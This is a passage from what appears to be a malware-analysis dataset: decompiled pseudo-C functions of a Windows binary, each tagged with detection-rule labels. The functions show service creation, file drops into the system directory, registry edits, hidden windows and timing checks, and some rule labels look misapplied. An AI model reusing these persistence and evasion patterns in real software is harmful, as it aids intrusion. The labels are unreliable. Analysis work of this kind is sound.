        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401e90) overlaps instruction at (ram,0x00401e8f)\n// \n\nuint fcn.00401e20(uint param_1, int32_t param_2, uint param_3, uint param_4)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint8_t *unaff_EBX;\n    uint *puVar5;\n    uint *puVar6;\n    bool bVar7;\n    uchar uVar8;\n    ulong uVar9;\n    int32_t iStack28;\n    uint32_t uStack24;\n    uint uStack20;\n    uint uStack16;\n    int32_t iStack12;\n    \n    iStack12 = param_2;\n    uStack16 = param_1;\n    uStack20 = 0x401e32;\n    uVar9 = (*_sym.imp.MSVCRT.dll_fopen)();\n    iVar3 = uVar9;\n    if (iVar3 == 0) {\n        return 0;\n    }\n    if ((iVar3 < 1) || (0 < iVar3)) {\n        uStack16 = param_4;\n        iStack12 = iVar3;\n        uVar9 = CONCAT44(param_4, param_3);\n    }\n    uStack24 = uVar9 & 0xffffff00 | uVar9 + 0x8b;\n    puVar6 = &stack0xfffffffd;\n    pcVar1 = iVar3 + 0x52;\n    *pcVar1 = *pcVar1 + (uVar9 >> 0x20) + (0x74 < uVar9);\n    uVar8 = *pcVar1 < '\\0';\n    bVar7 = (POPCOUNT(*pcVar1) & 1U) == 0;\n    uStack20 = 1;\n    iStack28 = 0x401e5d;\n    (*_sym.imp.MSVCRT.dll_fwrite)();\n    if ((!bVar7) && (bVar7)) {\n        puVar5 = &stack0xffffffe4;\n        cVar2 = '\\x1e';\n        do {\n            puVar6 = puVar6 + -1;\n            puVar5 = puVar5 + -1;\n            *puVar5 = *puVar6;\n            cVar2 = cVar2 + -1;\n        } while ('\\0' < cVar2);\n        uVar4 = in(0x78);\n        return uVar4;\n    }\n    iStack28 = iVar3;\n    (*_sym.imp.MSVCRT.dll_fflush)();\n    if ((uVar8) || (!uVar8)) {\n        (*_sym.imp.MSVCRT.dll_fclose)(iVar3);\n    }\n    else {\n        *unaff_EBX = *unaff_EBX & 0xc3;\n    }\n    return 1;\n}\n",
        "token_count": 638
    },
    "004021a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004021a0(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_ch_00;\n    int32_t iVar1;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint var_4h;\n    \n    arg_ch_00 = arg_ch;\n    iVar1 = fcn.004038a0(arg_8h, arg_ch, &var_4h, &arg_ch, unaff_EDI, unaff_ESI);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    *(iVar1 + 0x58) = arg_ch;\n    fcn.004038a0(arg_8h, arg_ch_00, &var_4h, &arg_ch, unaff_EDI, unaff_ESI);\n    return 1;\n}\n",
        "token_count": 181
    },
    "00402500": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040258f) overlaps instruction at (ram,0x0040258b)\n// \n// WARNING: Removing unreachable block (ram,0x00402571)\n// WARNING: Removing unreachable block (ram,0x00402549)\n// WARNING: Removing unreachable block (ram,0x00402532)\n// WARNING: Removing unreachable block (ram,0x0040253e)\n// WARNING: Removing unreachable block (ram,0x00402547)\n// WARNING: Removing unreachable block (ram,0x004024d7)\n// WARNING: Removing unreachable block (ram,0x00402625)\n\nchar * fcn.00402500(void)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    code *pcVar3;\n    uint8_t uVar4;\n    char *pcVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t extraout_ECX;\n    int32_t unaff_EBX;\n    uchar *puVar8;\n    uint *puVar9;\n    uint8_t in_AF;\n    bool bVar10;\n    bool bVar11;\n    bool bVar12;\n    uchar *puStack548;\n    uint var_210h;\n    uchar var_10ch;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10ch = 0;\n    var_4h = 0x104;\n    puVar9 = &var_10bh;\n    for (iVar7 = 0x40; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    *puVar9 = 0;\n    *(puVar9 + 2) = 0;\n    pcVar5 = fcn.004035d0(0x80000002, 0x406480, 0x4064c0, &var_8h, &var_210h);\n    bVar12 = false;\n    bVar11 = pcVar5 < 0;\n    bVar10 = pcVar5 == NULL;\n    puVar8 = &stack0xfffffffc;\n    while( true ) {\n        if (bVar10) {\n            return pcVar5;\n        }\n        if ((!bVar10 && bVar12 == bVar11) && (bVar10 || bVar12 != bVar11)) {\n            LOCK();\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        puStack548 = NULL;\n        iVar7 = (*_sym.imp.MSVCRT.dll__access)(puVar8 + -0x210);\n        if (iVar7 == -1) {\n            return NULL;\n        }\n        uVar6 = fcn.00402390(puVar8 + -0x210, puVar8 + -0x10c);\n        pcVar3 = _sym.imp.MSVCRT.dll_strstr;\n        if (uVar6 == 0) break;\n        if ((uVar6 < 1) || (0 < uVar6)) {\n            iVar7 = (*_sym.imp.MSVCRT.dll_strstr)(puVar8 + -0x10c, 0x4064d8);\n            if (iVar7 == 0) {\n    // WARNING: Bad instruction - Truncating control flow here\n                iVar7 = (*pcVar3)(puVar8 + -0x10c, 0x4064dc);\n                return iVar7 != 0;\n            }\n            return 0x1;\n        }\n        in_AF = 9 < (uVar6 & 0xf) | in_AF;\n        uVar2 = uVar6 + in_AF * '\\x06';\n        uVar4 = uVar2 & 0xf;\n        pcVar5 = uVar6 & 0xffff0000 | CONCAT11((uVar6 >> 8) + in_AF, uVar2) & 0xff0f;\n        if (extraout_ECX != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        *pcVar5 = *pcVar5 + uVar4 + in_AF;\n        pcVar1 = unaff_EBX + -0x3f7ae73c;\n        bVar12 = SCARRY1(*pcVar1, uVar4);\n        *pcVar1 = *pcVar1 + uVar4;\n        bVar11 = *pcVar1 < '\\0';\n        bVar10 = *pcVar1 == '\\0';\n        puVar8 = puStack548;\n    }\n    return NULL;\n}\n",
        "token_count": 1040
    },
    "00402b40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get common file path"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402bb7) overlaps instruction at (ram,0x00402bb6)\n// \n// WARNING: Control flow encountered bad instruction data\n\nuint fcn.00402b40(uint param_1)\n\n{\n    int32_t iVar1;\n    int32_t extraout_ECX;\n    uchar *arg_ch;\n    uchar *puVar2;\n    int32_t unaff_ESI;\n    uint *puVar3;\n    uchar uVar4;\n    char cVar5;\n    uchar uStack532;\n    uint uStack531;\n    uchar uStack272;\n    uchar auStack271 [259];\n    uchar auStack12 [7];\n    uchar uStack5;\n    \n    puVar2 = &stack0xfffffffc;\n    uStack532 = 0;\n    puVar3 = &uStack531;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    uStack272 = 0;\n    puVar3 = auStack271;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    uVar4 = 0;\n    cVar5 = '\\0';\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&uStack532, 0x104);\n    (*_sym.imp.MSVCRT.dll_sprintf)(&uStack272, 0x406024, &uStack532, param_1);\n    if ((uVar4) || (!uVar4)) {\n        arg_ch = auStack12;\n    }\n    else {\n        arg_ch = extraout_ECX + -1;\n        if (arg_ch != NULL && cVar5 != '\\0') {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        *(puVar3 + 3) = unaff_ESI + 4;\n        puVar2 = &uStack5;\n    }\n    fcn.00403290(puVar2 + -4, arg_ch);\n    fcn.00402c80(*(puVar2 + -4));\n    iVar1 = fcn.00401e20(puVar2 + -0x10c, 0x406044, *(puVar2 + -4), *(puVar2 + -8));\n    if (iVar1 != 0) {\n        fcn.004026b0(puVar2 + -0x10c, 0xffffffff);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 646
    },
    "00402e60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402ea5) overlaps instruction at (ram,0x00402ea2)\n// \n\nvoid __cdecl fcn.00402e60(uint noname_0, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    char *pcVar2;\n    uint16_t in_SS;\n    bool bVar3;\n    uint in_stack_0000000c;\n    uint in_stack_00000010;\n    \n    uVar1 = arg_ch - 1;\n    if (uVar1 == 0) {\n        bVar3 = false;\n        pcVar2 = fcn.004010b0();\n        if ((bVar3) || (!bVar3)) {\n            fcn.004044b0();\n        }\n        else {\n            uVar1 = uVar1 & 0xffff0000 | in_SS;\n            *pcVar2 = *pcVar2 + pcVar2;\n        }\n        if (*0x41f608 == 0) {\n            (*_sym.imp.USER32.dll_PostQuitMessage)(0, uVar1);\n            fcn.00401ee0();\n        }\n    }\n    (*_sym.imp.USER32.dll_DefWindowProcA)(noname_0, arg_ch, in_stack_0000000c, in_stack_00000010);\n    return;\n}\n",
        "token_count": 291
    },
    "00403110": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_67h\n\nvoid __cdecl fcn.00403110(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint unaff_EDI;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    _var_68h = _var_68h & 0xffffff00;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00402ee0(&var_68h, &var_4h, unaff_EDI, _var_68h);\n    fcn.00403ad0(&var_68h, var_4h, 0x406520, 0xa0c0);\n    *arg_8h = 0x406520;\n    *arg_ch = 0xa0c0;\n    return;\n}\n",
        "token_count": 284
    },
    "00403190": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004031e0) overlaps instruction at (ram,0x004031df)\n// \n\nuint __cdecl fcn.00403190(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint *puVar1;\n    char unaff_BL;\n    uint32_t uVar2;\n    \n    uVar2 = &stack0xfffffffc & 0xffff0000 | *0x10 - 4;\n    puVar1 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)\n                       (*(uVar2 + 8), *(uVar2 + 0xc), *(uVar2 + 0xc), 0xf01ff, 1, 0, 1, *(uVar2 + 0x10), 0, 0, 0, 0, 0);\n    if (puVar1 != NULL) {\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)();\n        *0x4031e7 = *puVar1;\n        *0x403249 = *0x403249 + unaff_BL;\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 256
    },
    "00403200": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403221) overlaps instruction at (ram,0x00403220)\n// \n\nchar * __cdecl fcn.00403200(char *arg_8h, int32_t arg_ch, char *arg_10h, int32_t arg_14h)\n\n{\n    char *in_EAX;\n    int32_t iVar1;\n    char *pcVar2;\n    char *pcVar3;\n    char *pcVar4;\n    bool bVar5;\n    \n    pcVar2 = arg_8h + (arg_ch - arg_14h);\n    bVar5 = (POPCOUNT(pcVar2 & 0xff) & 1U) != 0;\n    if (((bVar5) && (!bVar5)) || (in_EAX = arg_8h,  arg_14h == 0)) {\n        return in_EAX;\n    }\n    if (arg_8h <= pcVar2) {\n        do {\n            if (*arg_8h == *arg_10h) {\n                bVar5 = true;\n                iVar1 = arg_14h;\n                pcVar3 = arg_8h;\n                pcVar4 = arg_10h;\n                do {\n                    pcVar4 = pcVar4 + 1;\n                    pcVar3 = pcVar3 + 1;\n                    iVar1 = iVar1 + -1;\n                    if (iVar1 == 0) break;\n                    bVar5 = *pcVar3 == *pcVar4;\n                } while (bVar5);\n                if (bVar5) {\n                    return arg_8h;\n                }\n            }\n            arg_8h = arg_8h + 1;\n        } while (arg_8h <= pcVar2);\n    }\n    return NULL;\n}\n",
        "token_count": 388
    },
    "00403290": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403290(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00403340(&var_68h, &var_4h);\n    fcn.00403ad0(&var_68h, var_4h, 0x4105e0, 0xf000);\n    *arg_8h = 0x4105e0;\n    *arg_ch = 0xf000;\n    return;\n}\n",
        "token_count": 240
    },
    "00403340": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004034bd) overlaps instruction at (ram,0x004034bc)\n// \n// WARNING: Removing unreachable block (ram,0x004033df)\n// WARNING: Removing unreachable block (ram,0x004034a1)\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.00403340(uint32_t *param_1, uint8_t param_2, uchar *param_3)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    uint32_t *puVar3;\n    uint32_t *puVar4;\n    uint16_t uVar5;\n    uchar *in_EAX;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint8_t uVar8;\n    int32_t unaff_EBX;\n    uint32_t **ppuVar9;\n    uint *puVar10;\n    uint32_t unaff_ESI;\n    uint32_t uVar11;\n    uint32_t *puVar12;\n    bool in_PF;\n    bool bVar13;\n    bool bVar14;\n    bool bVar15;\n    uint uStack28;\n    uint32_t *apuStack24 [2];\n    \n    puVar10 = &stack0xfffffffc;\n    if ((in_PF) || (!in_PF)) {\n        *param_3 = 0x34;\n        in_EAX = param_3;\n    }\n    puVar12 = unaff_EBX + 0xc60845;\n    *puVar12 = *puVar12 | 0x34;\n    if ((*puVar12 == 0) || (param_1 = (param_1 >> 8 & 0xffff00) << 8 | param_1 & 0xffff,  *puVar12 != 0)) {\n        in_EAX[1] = 0xed;\n    }\n    else {\n        puVar10 = &stack0xfffffffc * 2;\n    }\n    uVar7 = puVar10[2];\n    *(uVar7 + 2) = 0x36;\n    puVar12 = puVar10[2];\n    *(puVar12 + 3) = 0xef;\n    bVar15 = false;\n    uVar8 = param_2 ^ unaff_EBX >> 8 | 0x67;\n    bVar14 = uVar8 < '\\0';\n    uVar8 = POPCOUNT(uVar8);\n    apuStack24[0] = param_1;\n    do {\n        puVar3 = apuStack24[0];\n        bVar13 = (uVar8 & 1) == 0;\n        *(puVar12 + 1) = 0x39;\n        if (((bVar15 == bVar14) &&\n            (apuStack24[0] = apuStack24[0] & 0xffff | apuStack24[0] << 0x10,  puVar4 = apuStack24[0],  bVar15 != bVar14)\n            ) || (*(puVar12 + 5) = 0x6a,  uVar6 = uVar7,  uVar11 = unaff_ESI,  puVar4 = puVar12,  bVar15 == bVar14)) {\n            apuStack24[0] = puVar4;\n            bVar15 = SCARRY4(unaff_ESI, 0x57197c6a);\n            uVar6 = unaff_ESI + 0x57197c6a;\n            bVar14 = uVar6 < 0;\n            bVar13 = (POPCOUNT(uVar6 & 0xff) & 1U) == 0;\n            uVar11 = uVar7;\n            puVar12 = apuStack24[0];\n            if (bVar15 != bVar14) {\n                puVar12 = (apuStack24[0] | puVar10) + 1;\n                *(apuStack24[0] | puVar10) = uVar6;\n                bVar15 = false;\n                uVar5 = uVar6 + (uVar6 >> 8) * 'y';\n                bVar14 = false;\n                bVar13 = (POPCOUNT(uVar5) & 1U) == 0;\n                uVar6 = uVar6 & 0xffff0000 | uVar5;\n                uVar11 = uVar7 - 1;\n            }\n        }\n        *(puVar12 + 6) = 0x5d;\n        if ((!bVar15) && (apuStack24[0] = apuStack24[0] & 0xffff | puVar3 << 0x10,  bVar15)) {\n            LOCK();\n            uVar11 = 0x138b2633;\n            bVar15 = SCARRY4(uVar6, 0x658f517f);\n            uVar6 = uVar6 + 0x658f517f;\n            bVar14 = uVar6 < 0;\n            bVar13 = (POPCOUNT(uVar6 & 0xff) & 1U) == 0;\n        }\n        *(puVar12 + 7) = 0xdf;\n        if ((bVar13) || (!bVar13)) goto code_r0x00403424;\n        unaff_ESI = *puVar12;\n        *puVar12 = uVar11;\n        bVar15 = SBORROW4(puVar10, *(puVar10 + 0x5f9dff63));\n        puVar10 = puVar10 - *(puVar10 + 0x5f9dff63);\n        bVar14 = puVar10 < 0;\n        uVar8 = POPCOUNT(puVar10 & 0xff);\n        uVar7 = uVar6;\n    } while (bVar14);\n    bVar15 = false;\n    bVar14 = unaff_ESI < 0;\n    if (!bVar14) {\n        return uVar6;\n    }\ncode_r0x00403424:\n    *(puVar12 + 2) = 0x77;\n    if ((bVar15 == bVar14) && (bVar15 != bVar14)) {\n        puVar12 = puVar12 + 1;\n    }\n    else {\n        *(puVar12 + 9) = 0xc3;\n    }\n    *(puVar12 + 10) = 0x54;\n    *(puVar12 + 0xb) = 0x30;\n    apuStack24[0] = puVar3 & 0xffff;\n    iVar1 = puVar10[2];\n    *(iVar1 + 0xc) = 0x1f;\n    *(iVar1 + 0xd) = 0x38;\n    uVar5 = apuStack24[0] & 0xff | (apuStack24[0] >> 8) << 8;\n    *(iVar1 + 0xe) = 0xf0;\n    while( true ) {\n        *(iVar1 + 0xf) = 0xb6;\n        cVar2 = apuStack24[0] & 0xff;\n        bVar14 = (POPCOUNT(uVar5 + 1 & 0xc9) & 1U) != 0;\n        *(iVar1 + 0x10) = 0xc6;\n        if ((bVar14) && (!bVar14)) {\n            ppuVar9 = apuStack24;\n            cVar2 = '\\x1e';\n            do {\n                puVar10 = puVar10 + -1;\n                ppuVar9 = ppuVar9 + -1;\n                *ppuVar9 = *puVar10;\n                cVar2 = cVar2 + -1;\n            } while ('\\0' < cVar2);\n            uVar7 = in(0x78);\n            return uVar7;\n        }\n        *(iVar1 + 0x11) = 0xd9;\n        uVar7 = puVar10[2];\n        *(uVar7 + 0x12) = 0x89;\n        if ((cVar2 < '\\x02') || ('\\x01' < cVar2)) break;\n        if ((puVar3 & 0xffff0000 | uVar5) != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    *(uVar7 + 0x13) = 0xb2;\n    *puVar10[3] = 0x14;\n    return uVar7;\n}\n",
        "token_count": 1884
    },
    "00403560": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040357e) overlaps instruction at (ram,0x00403575)\n// \n\nuint __cdecl fcn.00403560(uint arg_8h)\n\n{\n    uint hSCManager;\n    uint uVar1;\n    uint in_ECX;\n    char *in_EDX;\n    int32_t unaff_ESI;\n    char *unaff_EDI;\n    \n    *(unaff_ESI + 0x43d1773a) = *(unaff_ESI + 0x43d1773a) ^ 0x6827e95e;\n    *unaff_EDI = *unaff_EDI + in_ECX;\n    *in_EDX = *in_EDX + (in_ECX >> 8);\n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0);\n    uVar1 = fcn.00401d20(hSCManager, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 234
    },
    "004035d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403663) overlaps instruction at (ram,0x00403662)\n// \n// WARNING: Removing unreachable block (ram,0x00403655)\n// WARNING: Removing unreachable block (ram,0x0040365f)\n// WARNING: Removing unreachable block (ram,0x00403663)\n\nbool fcn.004035d0(uint param_1, uint param_2, uint32_t param_3, uint32_t *param_4)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    int32_t iVar5;\n    int32_t extraout_ECX;\n    uint32_t *puVar6;\n    int32_t unaff_EBX;\n    uchar *puVar7;\n    bool bVar8;\n    uint8_t in_AF;\n    unkbyte10 extraout_ST0;\n    ulong uVar9;\n    uint uStack8;\n    \n    uVar9 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(param_1, param_2, 0, 0x3f, *0x10 + -8);\n    puVar6 = uVar9 >> 0x20;\n    iVar5 = uVar9;\n    if (iVar5 == 0) {\n        puVar7 = &stack0xfffffffc;\n        if ((-1 < iVar5) && (puVar7 = &stack0xfffffffc,  -1 >= iVar5)) {\n            uVar4 = (in_AF | 1) * '\\x06' - 1;\n            uVar4 = uVar4 + (0x90 < (uVar4 & 0xf0) | (in_AF | 1) * (0xf9 < uVar4)) * '`';\n            uVar2 = *puVar6;\n            *0x8316dbec = extraout_ST0;\n            *puVar6 = *puVar6 + 0x458bdf84;\n            uVar3 = uVar4 + 0x75;\n            bVar8 = uVar4 < 0x8b || uVar3 < (0xba74207b < uVar2);\n            param_3 = uVar3 - (0xba74207b < uVar2) | 0xffffff00;\n            puVar1 = unaff_EBX + -0x74afebab;\n            uVar3 = *puVar1;\n            uVar4 = *puVar1 - extraout_ECX;\n            *puVar1 = uVar4 - bVar8;\n            *(extraout_ECX + -0x75) =\n                 *(extraout_ECX + -0x75) + (uVar9 >> 0x20) + (uVar3 < extraout_ECX || uVar4 < bVar8);\n            uStack8 = extraout_ECX;\n            param_4 = puVar6;\n            puVar7 = &uStack8 + 3;\n        }\n        iVar5 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(uStack8, param_3, 0, param_4);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(*(puVar7 + -4));\n        return iVar5 == 0;\n    }\n    return false;\n}\n",
        "token_count": 730
    },
    "00403b60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403ba8) overlaps instruction at (ram,0x00403ba6)\n// \n\nuint __cdecl fcn.00403b60(uint arg_8h)\n\n{\n    int32_t iVar1;\n    char extraout_DL;\n    int32_t unaff_EDI;\n    bool bVar2;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0;\n    uStack12 = arg_8h;\n    uStack16 = 0;\n    uStack20 = 0;\n    uStack24 = 0;\n    uStack28 = 0x80000000;\n    uStack32 = 0;\n    uStack36 = 0x80000000;\n    uStack40 = 0xcf0000;\n    uStack44 = 0x41f634;\n    uStack48 = 0x41f5f0;\n    uStack52 = 0;\n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)();\n    bVar2 = iVar1 == 0;\n    if (bVar2) {\n        return 0;\n    }\n    if ((bVar2) || (!bVar2)) {\n        (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n    }\n    else {\n        *(unaff_EDI + 0x6a) = *(unaff_EDI + 0x6a) - &uStack52;\n        *0xffffffff = *0xffffffff + extraout_DL;\n    }\n    return 1;\n}\n",
        "token_count": 399
    },
    "00404150": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00404150(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00404330(arg_8h, 1);\n    return iVar1 != 0;\n}\n",
        "token_count": 52
    },
    "004044b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004044b6) overlaps instruction at (ram,0x004044b3)\n// \n// WARNING: Removing unreachable block (ram,0x004044b6)\n// WARNING: Removing unreachable block (ram,0x00404584)\n// WARNING: Removing unreachable block (ram,0x00404591)\n// WARNING: Removing unreachable block (ram,0x00404542)\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.004044b0(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    bool bVar3;\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uchar var_20h;\n    uint var_1fh;\n    \n    iVar1 = fcn.004042b0();\n    bVar3 = iVar1 == 0;\n    if (bVar3) {\n        fcn.00404660();\n        return false;\n    }\n    if ((!bVar3) && (bVar3)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    func_0x00403680();\n    iVar1 = fcn.004039f0(0x406074);\n    if (iVar1 != -1) {\n        iVar1 = fcn.004039f0(0x406068);\n        if (iVar1 == -1) {\n            fcn.00404660();\n        }\n        return false;\n    }\n    fcn.004017c0();\n    iVar1 = fcn.00402800();\n    if (iVar1 == 0) {\n        var_20h = 0;\n        var_80h._0_1_ = 0;\n        puVar2 = &var_1fh;\n        for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar2 = 0;\n            puVar2 = puVar2 + 1;\n        }\n        *puVar2 = 0;\n        *(puVar2 + 2) = 0;\n        var_60h._0_1_ = 0;\n        puVar2 = &var_80h + 1;\n        for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar2 = 0;\n            puVar2 = puVar2 + 1;\n        }\n        *puVar2 = 0;\n        *(puVar2 + 2) = 0;\n        var_40h._0_1_ = 0;\n        puVar2 = &var_60h + 1;\n        for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar2 = 0;\n            puVar2 = puVar2 + 1;\n        }\n        *puVar2 = 0;\n        *(puVar2 + 2) = 0;\n        puVar2 = &var_40h + 1;\n        for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar2 = 0;\n            puVar2 = puVar2 + 1;\n        }\n        *puVar2 = 0;\n        *(puVar2 + 2) = 0;\n        iVar1 = fcn.00402210(&var_80h, &var_60h, &var_20h, &var_40h);\n        if (iVar1 == 0) {\n            return false;\n        }\n        iVar1 = fcn.00402b40(&var_20h);\n        if (iVar1 == 0) {\n            return false;\n        }\n        iVar1 = fcn.004028a0(&var_80h, &var_60h, &var_20h, &var_40h);\n        return iVar1 != 0;\n    }\n    return false;\n}\n",
        "token_count": 885
    },
    "00404660": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set registry value",
            "delete registry key"
        ],
        "decompiled_code": "\nvoid fcn.00404660(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint uStack332;\n    uint uStack328;\n    uint uStack324;\n    uint uStack320;\n    uint uStack316;\n    char *pcStack312;\n    uint uStack308;\n    uint uStack304;\n    uchar *puStack300;\n    uchar *puStack296;\n    uchar uStack276;\n    uint uStack275;\n    uint uStack271;\n    uint uStack267;\n    ushort uStack263;\n    uchar uStack261;\n    uchar uStack260;\n    uint uStack259;\n    \n    uStack275 = 0;\n    uStack271 = 0;\n    uStack267 = 0;\n    uStack276 = 0;\n    uStack263 = 0;\n    uStack260 = 0;\n    uStack261 = 0;\n    puVar4 = &stack0xfffffefd;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    fcn.00401c00();\n    puStack296 = 0x4046aa;\n    fcn.00401dc0(&stack0xfffffeec, 5);\n    pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n    puStack296 = &stack0xfffffefc;\n    puStack300 = 0x4046c4;\n    (*_sym.imp.MSVCRT.dll_sprintf)();\n    puStack296 = 0x4046d7;\n    (*_sym.imp.SHLWAPI.dll_SHDeleteKeyA)();\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    puStack300 = &stack0xfffffee4;\n    puStack296 = 0x10;\n    uStack304 = 1;\n    uStack308 = 0x41f634;\n    pcStack312 = str.GZV_;\n    uStack316 = 0x80000000;\n    uStack320 = 0x4046f7;\n    (*_sym.imp.SHLWAPI.dll_SHSetValueA)();\n    uStack320 = 0x4b;\n    uStack324 = 0x40639c;\n    uStack328 = 1;\n    uStack332 = 